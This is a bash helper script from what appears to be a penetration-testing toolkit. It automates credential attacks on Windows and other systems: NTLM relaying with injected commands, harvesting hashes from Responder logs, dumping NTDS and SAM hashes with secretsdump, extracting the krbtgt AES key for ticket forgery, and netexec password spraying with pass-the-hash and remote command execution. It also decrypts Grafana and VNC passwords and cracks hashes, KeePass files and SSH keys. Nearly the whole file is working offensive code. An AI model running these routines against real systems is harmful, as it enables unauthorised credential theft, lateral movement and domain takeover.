#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source "$SCRIPTDIR/.env"
source "$SCRIPTDIR/general.sh"
source "$SCRIPTDIR/mimikatz.sh"

use_host_for_cracking() {
    if [[ ! -z "$host_username" ]] && [[ ! -z "$host_computername" ]]; then
        return 0
    else
        echo "Host username and computer name must be set before using host for cracking."
        return 1
    fi
}

john_generic() {
    if [[ -z "$hash_file" ]]; then
        echo "Hash file must be set before running John the Ripper."
        return 1
    fi
    if [[ ! -f "$hash_file" ]]; then
        echo "$hash_file not found, cannot run John the Ripper."
        return 1
    fi
    if [[ -z "$john_wordlist" ]]; then
        john_wordlist="/usr/share/wordlists/rockyou.txt"
    fi
    local john_rule_option=""
    if [[ ! -z "$john_rule" ]]; then
      if [[ ! -f "$john_rule" ]]; then
            echo "John rule file not found, using default rules."
            john_rule="/usr/share/john/rules/best64.rule"
        fi
        echo "[List.Rules:generalRules]" > "john-local.conf"
        cat "$john_rule" >> "john-local.conf"
        john_rule_option="--rules=generalRules"
    fi
    john --wordlist="$john_wordlist" $john_rule_option "$hash_file"
}

john_ssh_password() {
     if [[ -z "$identity" ]]; then
        echo "Identity file must be set before running hashcat for SSH password."
        return 1
    fi
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.$identity"
    else
        echo "Using provided hash file: $hash_file"
    fi
    if [[ ! -f "$hash_file" ]]; then
        echo "Running ssh2john to generate hash file."
        ssh2john "$identity" > "$hash_file"
    else
        echo "$hash_file already exists, skipping ssh2john."
    fi
    john_generic
}

john_show() {
    if [[ -z "$hash_file" ]]; then
        echo "Hash file must be set before running John the Ripper --show."
        return 1
    fi
    john --show "$hash_file"
}

start_ntlmrelay() {
    if [[ -z "$target_ip" ]]; then
        echo "Target IP must be set before running ntlmrelay."
        return 1
    fi
    echo "Starting ntlmrelay on target IP: $target_ip"
    
    if [[ ! -z "$cmd" ]]; then
        ntlmrelay_additional_options="$ntlmrelay_additional_options -c \"$cmd\""
    fi
    if pgrep -f "ntlmrelayx"; then
        echo "ntlmrelay is already running, skipping."
        return 0
    fi
    local relay_command="ntlmrelayx.py --no-http-server -smb2support -t $target_ip $ntlmrelay_additional_options"
    echo $relay_command
    eval "$relay_command" | tee -a $trail_log

}

stop_ntlmrelay() {
    if pgrep -f "ntlmrelayx"; then
        echo "Stopping ntlmrelay..."
        sudo pkill -f "ntlmrelayx"
    else
        echo "No ntlmrelay process found."
    fi
}



get_hash_from_responder_txt() {
    if [[ -z "$target_ip" ]]; then
        echo "Target IP must be set before running Responder."
        return 1
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running Responder."
        return 1
    fi
    if [[ -z "$responder_txt" ]]; then
        if [[ -z "$target_ip" ]]; then
            echo "Target IP must be set before running Responder."
            return 1
        fi
        if [[ -z "$target_protocol" ]]; then
            target_protocol="SMB"
        fi
        if [[ -z "$target_hash_mode" ]]; then
            target_hash_mode="NTLMv2-SSP"
        fi        
        responder_txt="${target_protocol}-${target_hash_mode}-${target_ip}.txt"
        responder_txt="/usr/share/responder/logs/$responder_txt"
    fi
    if [[ ! -f "$responder_txt" ]] || [[ ! -s "$responder_txt" ]]; then
        echo "Responder text file $responder_txt not found or empty."
        return 1
    fi
    ntlm_hash=$(cat "$responder_txt" | grep -i "$target_username" | tail -n 1)    
    if [[ -z "$ntlm_hash" ]]; then
        echo "NTLM hash for user $target_username not found in Responder text file."
        return 1
    fi
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.$target_username"        
    fi
    echo "Going to save NTLM hash to $hash_file"
    echo "$ntlm_hash" > "$hash_file"
}

append_lm_hash() {
    if [[ ! -z $1 ]]; then
        local lm_hash="00000000000000000000000000000000"
        echo "$lm_hash:$1"
    fi
}

remove_openssh_passphrase() {
    if [[ -z "$identity" ]]; then
        echo "Identity file must be set before removing passphrase."
        return 1
    fi
    if [[ -z $passphrase ]]; then
        echo "Passphrase must be set before removing passphrase."
        return 1
    fi
    ssh-keygen -p -f "$identity" -P $passphrase -N ""
}

run_grafana2hashcat() {
    cp $SCRIPTDIR/../python/grafana2hashcat.py .
    if [[ -z $grafana_hashfile ]]; then
        echo "Grafana hash file must be set before running grafana2hashcat."
        return 1
    fi
    sed -i 's/|/,/g' $grafana_hashfile
    python3 grafana2hashcat.py "$grafana_hashfile" -o "$hash_file"
    hashcat_generic_kdf
}

run_grafana_decrypt() {
    cp $SCRIPTDIR/../python/grafana_decrypt.py .
    if [[ -z $secret_key ]]; then
        echo "Secret key must be set before running grafana_decrypt."
        return 1
    fi
    if [[ -z $source_password ]]; then
        echo "Source password must be set before running grafana_decrypt."
        return 1
    fi
    sed -E -i "s/dataSourcePassword = .*/dataSourcePassword = \"$source_password\"/g" grafana_decrypt.py
    sed -E -i "s/grafanaINI_secretKey = .*/grafanaINI_secretKey = \"$secret_key\"/g" grafana_decrypt.py
    python3 grafana_decrypt.py 
}

run_netexec() {
    if [[ -z "$netexec_protocol" ]]; then
        netexec_protocol=smb
    fi
    if [[ -z "$target_ip" ]]; then
        echo "Target IPs must be set before running netexec."
        return 1
    fi
    local netexec_user_options=""
    if [[ -z "$username" ]]; then
        username="usernames.txt"
    fi
    if [[ ! -z "$username" ]]; then
        netexec_user_options="-u $username"
        echo "Using $netexec_user_options"
    fi
    local netexec_password_options=""
    if [[ -z "$password" ]]; then
        password="passwords.txt"
        if [[ ! -f "$password" ]]; then
            echo "Password file $password not found. Assuming you wanted blank password"
            password=""
        fi
    fi
    if [[ ! -z "$domain" ]]; then
        netexec_additional_options+=" -d $domain"
        echo "Using domain $domain"
    fi
    if [[ ! -z "$password" ]]; then
        netexec_password_options="-p '$password'"
        echo "Using $netexec_password_options"
    fi
    if [[ ! -z "$ntlm_hash" ]]; then
        netexec_password_options="-H $ntlm_hash"
        echo "Using NTLM hash for authentication."
    fi
    local proxychain_command=""
    if [[ ! -z "$use_proxychain" ]] && [[ "$use_proxychain" == "true" ]]; then
        proxychain_command="proxychains -q "
        echo "Running netexec with proxychains"
    fi
    local log_file=""
    if [[ -z $log_file ]]; then
        log_file="$log_dir/netexec_$target_ip.log"
    fi
    if [[ ! -z $run_cmd ]] && [[ "$run_cmd" == "true" ]]; then
        netexec_additional_options+=" -X \"$cmd\""
    fi
    eval_string="${proxychain_command}netexec $netexec_protocol $target_ip $netexec_user_options $netexec_password_options $netexec_additional_options"
    echo "$eval_string"
    eval "$eval_string" | tee >(remove_color_to_log >> "$log_file")
    #eval ${proxychain_command}netexec $netexec_protocol $target_ip $netexec_user_options $netexec_password_options $netexec_additional_options
}

trim_rockyou() {
    local minimal_characters=$1
    if [[ -z "$minimal_characters" ]]; then
        echo "Minimal characters must be set."
        return 1
    fi
    awk "length(\$0) >= $minimal_characters" /usr/share/wordlists/rockyou.txt > rockyou_${minimal_characters}plus.txt
}

run_simple_brute_list() {
    if [[ -z $username ]]; then
        echo "Username list must be provided for simple brute force."
        return 1
    fi
    if [[ ! -f $username ]]; then
        echo "Username file $username not found."
        return 1
    fi
    while read -r user; do
        run_simple_brute "$user"
    done < "$username"
}

run_simple_brute() {
    local username=$1
    if [[ -z "$username" ]]; then
        echo "Username must be provided for simple brute force."
        return 1
    fi
    echo $username > temp_passwords.txt
    echo $username | rev >> temp_passwords.txt
    echo password >> temp_passwords.txt
    password=temp_passwords.txt
    run_netexec

}

perform_kdbx_recovery() {
    if [[ ! -f $kdbx_file ]]; then
        echo "Could not find file $kdbx_file specified"
        return 1
    fi
    hash_file=hashes.${kdbx_file%.kdbx}
    kdbx_password=$(hashcat_show | grep keepass | awk -F':' '{print $2}')
    echo $kdbx_password
    if [[ -z $kdbx_password ]]; then
        hashcat_kdbx
    fi
}

run_keepassxc_cli_command () {
    echo $kdbx_password | keepassxc-cli $1 $kdbx_file "$2"
}

get_ntlm_hashes_from_ntds() {

    if [[ -z $target_username ]]; then
        echo "No target username provided"
        return 1
    fi
    local secrets_dump_options=""
    if [[ -z $target_system ]]; then
        target_system=system.hive
        echo "No target SYSTEM provided, using default $target_system"
    fi
    if [[ ! -f "$target_system" ]]; then
        echo "No target SYSTEM provided and default $target_system not found, cannot get hashes from secretsdump."
        return 1
    fi
    secrets_dump_options+=" -system $target_system"
    if [[ -z $target_ntds ]]; then
        target_ntds=ntds.dit
        echo "No target NTDS provided, using default $target_ntds"
    fi
    if [[ ! -f "$target_ntds" ]]; then
        echo "No target NTDS provided and default $target_ntds not found, cannot get hashes from secretsdump."
        return 1
    fi
    secrets_dump_options+=" -ntds $target_ntds"
    if [[ -z "$dump_file_base" ]]; then
        dump_file_base=hashes.secretsdump
    fi
    local dump_file="$dump_file_base.ntds"
    echo "Using secrets dump file $dump_file"
    if [[ ! -f "$dump_file" ]]; then
        echo "Secrets dump file $dump_file not found, creating it..."
        impacket-secretsdump $secrets_dump_options LOCAL -outputfile $dump_file_base
    fi
    if [[ -z "$target_domain" ]]; then
        hash_file=$dump_file_base.$target_username
    else
        hash_file=$dump_file_base.$target_domain.$target_username
    fi
    ntlm_hash=$(cat "$dump_file" | grep $target_username | head -n 1 | awk -F':' '{print $4}')
    if [[ -z $ntlm_hash ]]; then
        echo "No NTLM hash found for $target_username"
        return 1
    fi
    echo $ntlm_hash > $hash_file

}


get_cupp() {
    local url="https://raw.githubusercontent.com/Mebus/cupp/refs/heads/master/cupp.py"
    if [[ ! -f cupp.py ]]; then
        wget $url -O cupp.py
        chmod +x cupp.py
    fi
}

create_password_list() {
    if [[ -z "$password_input_file" ]]; then
        password_input_file="passwords_input.txt"
        echo "No password input file provided, using default $password_input_file"

    fi

    if [[ ! -f "$password_input_file" ]]; then
        echo "Password input file $password_input_file not found."
        echo "Creating password input file using defaults"
        echo "January" > "$password_input_file"
        echo "February" >> "$password_input_file"
        echo "March" >> "$password_input_file"
        echo "April" >> "$password_input_file"
        echo "May" >> "$password_input_file"
        echo "June" >> "$password_input_file"
        echo "July" >> "$password_input_file"
        echo "August" >> "$password_input_file"
        echo "September" >> "$password_input_file"
        echo "October" >> "$password_input_file"
        echo "November" >> "$password_input_file"
        echo "December" >> "$password_input_file"
        echo "Spring" >> "$password_input_file"
        echo "Summer" >> "$password_input_file"
        echo "Fall" >> "$password_input_file"
        echo "Autumn" >> "$password_input_file"
        echo "Winter" >> "$password_input_file"        
    fi

    if [[ -z "$password_file" ]]; then
        password_file="passwords.txt"
        echo "No password file provided, using default $password_file"
    fi

    if [[ -z "$password_rules" ]]; then
        password_rules="password_rules.txt"
    fi
    if [[ ! -f "$password_rules" ]]; then
        echo "Creating default password rules file $password_rules"
        echo ':' > "$password_rules"
        echo '$2$0$2$0' >> "$password_rules"
        echo '$2$0$2$1' >> "$password_rules"
        echo '$2$0$2$2' >> "$password_rules"
        echo '$2$0$2$3' >> "$password_rules"
        echo '$2$0$2$4' >> "$password_rules"
        echo '$2$0$2$5' >> "$password_rules"
    fi
    if [[ ! -f "password_rules_toggle.txt" ]]; then
        echo "Creating default password toggle rules file password_rules_toggle.txt"
        echo 'T0' > "password_rules_toggle.txt"

    fi
    hashcat --stdout "$password_input_file" -r "$password_rules"  -r "password_rules_toggle.txt" | sort -u > "$password_file"
}

get_ntlm_hashes_from_ntds() {
    #if [[ -z $target_username ]]; then
    #    echo "No target username provided"
    #    return 1
    #fi
    local secrets_dump_options=""
    if [[ -z $target_ntds ]]; then
        target_ntds=ntds.dit
        echo "No target NTDS provided, using default $target_ntds"
    fi
    if [[ ! -f "$target_ntds" ]]; then
        echo "No target NTDS provided and default $target_ntds not found, cannot get hashes from secretsdump."
        return 1
    fi
    secrets_dump_options+=" -ntds $target_ntds"
    if [[ -z $target_system ]]; then
        target_system=system.hive
        echo "No target SYSTEM provided, using default $target_system"
    fi
    if [[ ! -f "$target_system" ]]; then
        echo "No target SYSTEM provided and default $target_system not found, cannot get hashes from secretsdump."
        return 1
    fi
    if [[ -z $target_security ]]; then
        target_security=security.hive
        echo "No target SECURITY provided, using default $target_security"
    fi
    if [[ ! -f "$target_security" ]]; then
        echo "No target SECURITY provided and default $target_security not found, cannot get hashes from secretsdump."
        return 1
    fi
    secrets_dump_options+=" -security $target_security"
    secrets_dump_options+=" -system $target_system"
    if [[ -z "$dump_file_base" ]]; then
        dump_file_base=hashes.secretsdump
    fi
    local dump_file="$dump_file_base.ntds"
    if [[ ! -f "$dump_file" ]]; then
        echo "Secrets dump file $dump_file not found, creating it..."
        impacket-secretsdump $secrets_dump_options LOCAL -outputfile $dump_file_base
    fi

    #replace the hashfile
    if [[ -z "$target_domain" ]]; then
        hash_file=$dump_file_base.$target_username
    else
        hash_file=$dump_file_base.$target_domain.$target_username
    fi
    ntlm_hash=$(cat "$dump_file" | grep $target_username | head -n 1 | awk -F':' '{print $4}')
    if [[ -z $ntlm_hash ]]; then
        echo "No NTLM hash found for $target_username"
        return 1
    fi
    echo $ntlm_hash > $hash_file

}

get_ntlm_hashes_from_sam_hives() {

    if [[ ! -z "$1" ]]; then
        target_username="$1"
    fi
    if [[ -z $target_username ]]; then
        echo "No target username provided"
        return 1
    fi
    local secrets_dump_options=""
    if [[ -z $target_sam ]]; then
        target_sam=sam.hive
        echo "No target SAM provided, using default $target_sam"
    fi
    if [[ ! -f "$target_sam" ]]; then
        echo "No target SAM provided and default $target_sam not found, cannot get hashes from secretsdump."
        return 1
    fi    
    secrets_dump_options="-sam $target_sam"
    if [[ -z $target_system ]]; then
        target_system=system.hive
        echo "No target SYSTEM provided, using default $target_system"
    fi
    if [[ ! -f "$target_system" ]]; then
        echo "No target SYSTEM provided and default $target_system not found, cannot get hashes from secretsdump."
        return 1
    fi
    secrets_dump_options+=" -system $target_system"
    if [[ ! -z $target_security ]]; then
        if [[ -f "$target_security" ]]; then
            secrets_dump_options+=" -security $target_security"
        fi
    fi
    if [[ -z "$dump_file_base" ]]; then
        dump_file_base=hashes.secretsdump
    fi
    local dump_file="$dump_file_base.sam"
    if [[ ! -f "$dump_file" ]]; then
        echo "Secrets dump file $dump_file not found, creating it..."
        impacket-secretsdump $secrets_dump_options LOCAL -outputfile $dump_file_base
    fi
    #replace the hashfile
    if [[ -z "$target_domain" ]]; then
        hash_file=$dump_file_base.$target_username
    else
        hash_file=$dump_file_base.$target_domain.$target_username
    fi
    ntlm_hash=$(cat "$dump_file" | grep $target_username | awk -F':' '{print $4}')
    if [[ -z $ntlm_hash ]]; then
        echo "No NTLM hash found for $target_username"
        return 1
    fi
    echo $ntlm_hash > $hash_file

}

get_ntlm_hash_from_secretsdump() {
    if [[ -z $dump_file ]]; then
        echo "No full dump file provided"
        return 1
    fi
    if [[ -z $target_username ]]; then
        echo "No target username provided"
        return 1
    fi
    ntlm_hash=$(cat "$dump_file" | grep $target_username | awk -F':' '{print $4}')
    if [[ -z $ntlm_hash ]]; then
        echo "No NTLM hash found for $target_username"
        return 1
    fi
    hash_file=$dump_file.$target_username
    echo $ntlm_hash > $hash_file

}

get_aes_key_from_secretsdump() {
    if [[ -z $dump_file ]]; then
        echo "No full dump file provided"
        return 1
    fi
    if [[ -z $target_username ]]; then
        echo "No target username provided"
        return 1
    fi
    if [[ $target_username != "krbtgt" ]]; then
        echo "Warning: for ticket forgery, we normally use krbtgt user. You are using $target_username"
    fi
    aes_key=$(cat "$dump_file" | grep $target_username | head -n 1 | awk -F':' '{print $3}')
    if [[ -z $aes_key ]]; then
        echo "No AES key found for $target_username"
        return 1
    fi
    hash_file=$dump_file.$target_username
    echo "AES key for $target_username is $aes_key"
    echo $aes_key > $hash_file
}

decrypt_vnc_password() {
    if [[ -z $1 ]]; then
        echo "Usage: $0 <encrypted_hex>"
        exit 1
    fi
    local encrypted_hex=$1
    perl $SCRIPTDIR/../perl/vnc_decrypt.pl "$encrypted_hex"
}

generate_ntlm_hash() {
    if [[ -z $password ]]; then
        password=$1
    fi
    if [[ -z $password ]]; then
        echo "Password must be set before generating NTLM hash."
        return 1
    fi
    python -c "import impacket.ntlm; import binascii; from impacket.ntlm import compute_nthash; print(binascii.hexlify(compute_nthash('$password')).decode())"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    if [[ -z "$1" ]]; then
        echo "Usage: $0 <command>"
        echo "Available commands: crack_ssh_identity, hashcat_ntlm, start_ntlmrelay, stop_ntlmrelay, hashcat_kerberoast, hashcat_asrep_kerberoast, hashcat_show <hash_mode> <hash_file>, hashcat_keepass, hashcat_ssh_password <identity_file>, john_ssh_password <identity_file>, john_rule <john_rule_file>, john_show <hash_file>, run_mimikatz_lsadump_sam <mimikatz_log> <target_username>, hashcat_kdbx <kdbx_file> <hashcat_rule>"
        exit 1
    fi

    command=$1
    case $command in
        crack_ssh_identity)
            crack_ssh_identity
            ;;
        hashcat_ntlm)
            hashcat_ntlm
            ;;
        start_ntlmrelay)
            start_ntlmrelay
            ;;
        stop_ntlmrelay)
            stop_ntlmrelay
            ;;
        hashcat_kerberoast)
            hashcat_kerberoast
            ;;
        hashcat_asrep_kerberoast)
            hashcat_asrep_kerberoast
            ;;
        hashcat_show)
            hash_mode=$2
            hash_file=$3
            hashcat_show
            ;;
        hashcat_keepass)
            hashcat_keepass
            ;;
        hashcat_ssh_password)
            identity_file=$2
            hashcat_ssh_password
            ;;
        hashcat_kdbx)
            kdbx_file=$2
            hashcat_rule=$3
            hashcat_kdbx "$kdbx_file"
            ;;
        john_ssh_password)
            identity_file=$2
            john_rule=$3
            john_ssh_password
            ;;
        john_show)
            hash_file=$2
            john_show
            ;;
        hashcat_net_ntlm)
            hash_file=$2
            hashcat_net_ntlm
            ;;
        run_mimikatz_lsadump_sam)
            mimikatz_log=$2
            target_username=$3
            run_mimikatz_lsadump_sam
            ;;
        append_lm_hash)
            if [[ -z "$2" ]]; then
                echo "Usage: $0 append_lm_hash <ntlm_hash>"
                exit 1
            fi
            append_lm_hash "$2"
            ;;
        get_hash_from_responder_txt)
            target_ip=$2
            target_username=$3
            responder_txt=$4
            get_hash_from_responder_txt
            ;;
        *)
            echo "Unknown command: $command"
            exit 1
            ;;
    esac
fi